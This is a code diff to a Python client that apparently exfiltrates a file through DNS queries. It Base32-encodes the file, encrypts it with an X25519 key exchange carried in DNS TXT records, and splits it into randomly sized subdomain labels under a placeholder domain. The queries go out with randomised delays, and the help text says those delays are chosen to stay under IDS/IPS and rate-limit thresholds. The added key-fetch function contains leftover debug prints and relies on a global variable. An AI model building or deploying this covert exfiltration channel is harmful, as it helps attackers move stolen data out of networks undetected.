@@ -20,13 +20,13 @@ import base64
 import hashlib
 import hmac
 import logging
+import math
 import os
+import random
 import socket
 import sys
 import time
 from uuid import uuid4
-import math
-import random
 
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
@@ -43,8 +43,6 @@ logger = logging.getLogger('client')
 # Constants
 MAX_RETRIES = 3
 DNS_IP = '192.0.2.1'
-
-
 
 
 def load_server_public_key(path):
@@ -89,7 +87,8 @@ def base32_encode(data):
     b32 = base64.b32encode(data).decode('ascii')
     return b32.rstrip('=')
 
-def chunk_payload(b32_string, identifier, domain, *, min_size=16, max_label_len=52):
+
+def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
     """
     Split Base32 string into DNS-safe subdomain labels of the form
       <identifier>-<idx>-<total>-<chunk>
@@ -100,7 +99,7 @@ def chunk_payload(b32_string, identifier, domain, *, min_size=16, max_label_len=
     # Estimate total segments if we used min_size chunks,
     # so we know how many digits “total” will consume.
     est_segments = max(1, math.ceil(len(b32_string) / min_size))
-    tot_digits   = len(str(est_segments))
+    tot_digits = len(str(est_segments))
 
     segments = []
     pos = 0
@@ -113,9 +112,7 @@ def chunk_payload(b32_string, identifier, domain, *, min_size=16, max_label_len=
         overhead = len(identifier) + idx_digits + tot_digits + 3
         available = max_label_len - overhead
         if available < min_size:
-            raise ValueError(
-                f"max_label_len={max_label_len} too small for min_size={min_size}"
-            )
+            raise ValueError(f"max_label_len={max_label_len} too small for min_size={min_size}")
         # pick a random size in [min_size, available]
         size = random.randint(min_size, available)
         segments.append(b32_string[pos:pos + size])
@@ -127,6 +124,7 @@ def chunk_payload(b32_string, identifier, domain, *, min_size=16, max_label_len=
     # Second pass: yield the properly formatted labels
     for idx, seg in enumerate(segments):
         yield f"{identifier}-{idx}-{total}-{seg}"
+
 
 # def chunk_payload(b32_string, identifier, domain):
 #     """
@@ -177,10 +175,11 @@ def perform_key_exchange(identifier, args):
     Generate ephemeral keypair, send public in chunks, derive shared keys.
     Returns (aes_key, hmac_key).
     """
-    server_pub = load_server_public_key(args.server_pubkey)
+    server_pub = x25519.X25519PublicKey.from_public_bytes(args.server_pubkey)
+    # load_server_public_key(args.server_pubkey)
     client_priv = x25519.X25519PrivateKey.generate()
     pub_bytes = client_priv.public_key().public_bytes(encoding=serialization.Encoding.Raw,
-        format=serialization.PublicFormat.Raw)
+                                                      format=serialization.PublicFormat.Raw)
     b32_pub = base32_encode(pub_bytes)
     # split into 50-char fragments
     parts = [b32_pub[i:i + 50] for i in range(0, len(b32_pub), 50)]
@@ -188,6 +187,20 @@ def perform_key_exchange(identifier, args):
         sub = f"{identifier}-0-0-{frag}"
         reliable_send(sub, args)
     return derive_shared_keys(client_priv, server_pub)
+
+
+def fetch_server_pubkey(domain):
+    q = DNSRecord.question(f"public.{domain}", 'TXT')
+    a = q.send(dest=args.server_ip, port=args.server_port, timeout=2)
+    txt = str(DNSRecord.parse(a).get_a().rdata).strip('"')
+    print(txt)
+    print(len(txt))
+    print('hello')
+    pad_len = (8 - len(txt) % 8) % 8
+    txt = str(txt) + "=" * pad_len  # add padding
+    print(txt)
+    # Or just take the first TXT string:
+    return base64.b32decode(txt)  # add padding if needed
 
 
 def main(args):
@@ -203,7 +216,7 @@ def main(args):
 
     # Send data chunks
     failures = []
-    for sub in chunk_payload(b32, identifier, args.domain):
+    for sub in chunk_payload(b32, identifier):
         time.sleep(random.uniform(args.low, args.high) / 1000.0)
         if not reliable_send(sub, args):
             failures.append(sub)
@@ -220,12 +233,15 @@ def parse_args():
     p.add_argument('--server-port', type=int, default=5300)
     p.add_argument('--file-path', required=True)
     p.add_argument('--domain', default='xf.example.com')
-    p.add_argument('--low', type=int, default=500, help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
-    p.add_argument('--high', type=int, default=1000, help='Should be adjusted to maintain a QPS of 1-2 queries per second.')
-    p.add_argument('--server-pubkey', default=os.getenv('SERVER_PUBLIC_KEY'), help='Path to server public key')
+    p.add_argument('--low', type=int, default=500,
+                   help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
+    p.add_argument('--high', type=int, default=1000,
+                   help='Should be adjusted to maintain a QPS of 1-2 queries per second.')
+
     return p.parse_args()
 
 
 if __name__ == '__main__':
     args = parse_args()
+    args.server_pubkey = fetch_server_pubkey(args.domain)
     main(args)
